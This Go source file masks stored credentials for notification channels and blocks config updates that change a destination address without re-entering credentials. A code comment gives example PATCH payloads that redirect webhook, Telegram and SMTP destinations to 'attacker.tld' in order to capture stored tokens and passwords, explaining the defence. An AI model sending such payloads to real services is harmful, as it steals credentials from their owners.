package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes credentials, it replaces the real content with a value carrying this prefix,
// and the update endpoint treats a value with this prefix as "keep the stored value unchanged".
//
// A prefix is used instead of an empty string or a fixed constant so that a little identifying information can be carried along
// (see MaskedValue), letting users tell "which bot this is" without pasting the secret again.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              original value too short, no hint given
//	"__masked__:…ab12cd"      carries the last 6 characters of the original as an identifying hint
//
// Exposing only the last 6 characters is deliberate: the identifying part of a Webhook address is in the last segment (such as the WeCom key,
// or the Feishu bot id), while the prefix is the same for every bot and has no identifying value. The last 6 characters are not enough to
// recover the credential, but are enough for the configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unchanged after being echoed by the endpoint).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by masked values.
//
// An unknown channel type returns an empty map instead of the original config: better for the UI to show "config unavailable"
// than to spit back the whole raw content, which may contain credentials, when the channel type is not recognized.
// Non-credential fields are kept as is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure such as headers is treated as one credential as a whole: judging each sub-key would require each channel
		// to declare another set of rules for "which sub-keys are credentials", and the complexity far exceeds the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed, but the caller took no position
// on the credential fields". It returns this instead of silently letting it through or silently dropping the credentials; see PrepareConfigUpdate for the reasons.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit position
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination address (" + strings.Join(e.Changed, ", ") + ") changed. Credential fields (" +
		strings.Join(e.Missing, ", ") + ") must be re-entered together: provide a new value, or leave empty to mark that credentials are no longer needed. " +
		"The existing credentials are valid only for the old address, so reusing them would hand them over to the new address."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of "destination address changed".
//
// It replaces the bare MergeConfig on the channel update path, and closes a path that was demonstrated to work:
// the destination address (where the message goes) and the credentials (the identity used to send) are two independent sets of fields, and MergeConfig
// keeps the stored value for every "unmentioned key". So anyone who can PATCH a channel can **change only the address and
// say nothing about the credentials**, and make the server send the real stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over the username and password after STARTTLS
//
// This path is completely silent and does not depend on redirects (so refusing cross-host redirects cannot stop it),
// and it directly defeats the goal of this package's masking mechanism: "credentials are not echoed to the browser".
//
// Rule: whenever a destination key is changed to a new value, the caller must take an explicit position on **every** credential key:
//   - give a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs credentials (keeps the clearing semantics)
//   - echo the masked value back unchanged / omit the key entirely → rejected
//
// The third case is also rejected because a "masked value" means exactly "keep using the old credentials", and the old credentials
// are valid only for the old address. Deliberately no "automatically drop the credentials" here: for optional credential fields
// (webhook headers, email password) that would silently become "authentication is gone but the endpoint returns 200",
// which is harder to diagnose than an error. Better to make the operator fill them in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("Unregistered channel type: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as the webhook headers object) has the mask literal embedded in it,
	// the caller has stuffed the "keep the original value" sentinel inside the structure. MergeConfig only recognizes a "string
	// with the prefix" as a mask, so this shape would be stored as an ordinary object as is: the literal
	// "__masked__" really lands in the database, and later authentication silently fails with no error at all. Better to reject it.
	//
	// This check must go **first**: when the address is unchanged the function returns early, and putting it later would
	// cover only the "address changed" path (the first version put it in the wrong place, and the tests caught it right away).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were really changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: do an ordinary merge (masked value keeps the original, empty string clears, the rest overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the mask sentinel inside a non-string structure.
//
// The masking mechanism presupposes that "the whole value is a string". An object field such as webhook headers
// can only be masked as a whole (written as the string "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// can neither express "keep unchanged" nor avoid being stored in the database as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("Field %s contains the mask marker (%q). This field must be either left entirely empty to keep the existing value or submitted entirely as a new value; a mask marker cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. JSON serialization is used for comparison to also handle
// type differences: the port submitted by the frontend is a number, while the one read back from the database is float64, and a direct == would misjudge.
//
// "Empty" must be normalized before comparing: an empty string and "key absent" are the same state in this config model,
// because MergeConfig treats an empty string as an explicit clear and deletes the key. Without normalization, an optional
// destination field that is always left empty (Telegram's base_url is the only such field: empty means use the
// official address) would take this path:
//
//	created with base_url:"" stored  →  the first save has the key deleted by MergeConfig
//	→ on the second save incoming is "" and stored lacks the key, judged as "address changed"
//	→ the credential is a masked value → 400 "destination address changed, please re-enter the credential fields"
//
// From then on every save fails unless the user pastes the Bot Token again, although they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "empty".
// The criterion must match MergeConfig's clearing rule (strings.TrimSpace(s) == ""),
// otherwise there is a gap where "MergeConfig thinks it should be deleted, sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming over stored, used when updating channel config.
//
// Rules:
//   - a key in incoming whose value is a mask → keep the stored original (the user did not change this field)
//   - a key in incoming whose value is an empty string → treated as an explicit clear, the key is deleted
//   - other keys → overwritten with the incoming value
//   - a key in stored but not in incoming → kept (partial update semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the frontend form submits unfilled fields as empty strings,
// and writing them as valid values would really clear fields that are meant to be "left empty to keep the original value".
// Explicit clearing is chosen here because the user has no other way to express removing a wrongly set field
// (dropping the field would distinguish "not provided" from "provided empty", but the UI has no use for that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
